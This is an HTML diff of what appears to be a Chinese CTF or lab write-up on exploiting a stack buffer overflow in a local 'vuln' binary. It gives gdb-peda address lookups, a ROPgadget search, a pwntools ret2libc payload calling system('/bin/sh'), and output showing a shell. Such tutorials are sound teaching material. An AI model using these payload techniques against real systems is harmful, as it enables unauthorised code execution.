@@ -87,19 +87,17 @@
 
 <p><code class="highlighter-rouge">system</code> 函数的地址可以简单获得</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p system
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ p system
 $1 = {&lt;text variable, no debug info&gt;} 0x400550 &lt;system@plt&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>而寻找 <code class="highlighter-rouge">/bin/sh</code> 可以使用 <code class="highlighter-rouge">find</code> 命令</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ find "/bin/sh"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ find "/bin/sh"
 Searching for '/bin/sh' in: None ranges
 Found 1 results, display max 1 items:
 libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>发现 libc 中有一个，而 <code class="highlighter-rouge">student</code> 内存我们可以控制，也可以自己放置一个，这次先使用 libc 中的。</p>
 
@@ -111,10 +109,9 @@ libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
 
 <p>可以看到结果是</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new ROPgadget --binary vuln | grep rdi
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new ROPgadget --binary vuln | grep rdi
 0x0000000000400803 : pop rdi ; ret
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>发现结果非常理想， <code class="highlighter-rouge">pop rdi; ret;</code> 可以复制参数到寄存器，其次是 <code class="highlighter-rouge">ret</code> 可以让程序再回到我们控制的地址上继续后续的执行。</p>
 
@@ -122,7 +119,7 @@ libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
 
 <p>仿照之前的写法，我们很简单就可以写出 shellcode</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span>
 <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="mh">0x7fffffffe2f0</span><span class="p">)</span>
 <span class="c"># pop rdi; ret</span>
@@ -133,14 +130,13 @@ libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
 <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400550</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">shellcode</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h2 id="分析">分析</h2>
 
 <p>这个栈布局已经是很清楚了</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>0016| 0x7fffffffe2f0 ('A' &lt;repeats 88 times&gt;, "\003\b@")
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0016| 0x7fffffffe2f0 ('A' &lt;repeats 88 times&gt;, "\003\b@")
 0024| 0x7fffffffe2f8 ('A' &lt;repeats 80 times&gt;, "\003\b@")
 0032| 0x7fffffffe300 ('A' &lt;repeats 72 times&gt;, "\003\b@")
 0040| 0x7fffffffe308 ('A' &lt;repeats 64 times&gt;, "\003\b@")
@@ -154,12 +150,11 @@ libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
 0104| 0x7fffffffe348 --&gt; 0x400803 (&lt;__libc_csu_init+99&gt;:	pop    rdi)
 0112| 0x7fffffffe350 --&gt; 0x7ffff7b99d17 --&gt; 0x68732f6e69622f ('/bin/sh')
 0120| 0x7fffffffe358 --&gt; 0x400550 (&lt;system@plt&gt;:	jmp    QWORD PTR [rip+0x200aca]        # 0x601020)
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>在 GDB 中运行，可以看到 <code class="highlighter-rouge">/bin/dash</code> 被执行，其实 <code class="highlighter-rouge">/bin/sh</code> 就仅仅是它的一个符号链接。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
 0x7fffffffe2f0What's Your Birth?
 What's Your Name?
@@ -172,14 +167,13 @@ process 4824 is executing new program: /bin/dash
 process 4825 is executing new program: /bin/dash
 [Inferior 3 (process 4825) exited normally]
 Warning: not running or target is remote
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>会发现两个 <code class="highlighter-rouge">/bin/dash</code> 的原因是 <code class="highlighter-rouge">system</code> 函数的原理是 <code class="highlighter-rouge">/bin/sh -c $cmd</code>，所以会先启动一个 <code class="highlighter-rouge">/bin/sh</code>，然后 <code class="highlighter-rouge">execve</code> 想运行的命令，这里还是 <code class="highlighter-rouge">/bin/sh</code>。</p>
 
 <p>因为禁用 ASLR 的原因，libc 的加载地址不变，这个 shellcode 也是可以直接运行的</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new (cat in.txt; cat) |./vuln
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new (cat in.txt; cat) |./vuln
 0x7fffffffe360What's Your Birth?
 What's Your Name?
 You Are Born In 1094795585
@@ -187,8 +181,7 @@ You Are Naive.
 You Speed One Second Here.
 id
 uid=1000(virusdefender) gid=1000(virusdefender) groups=1000(virusdefender),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>当然这个 gadget 也不唯一，比如 <code class="highlighter-rouge">python Ropper.py --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop|call"</code> 得到的 <code class="highlighter-rouge">0x00000000001073d9: pop rax; pop rdi; call rax;</code> 也非常好用。</p>
 
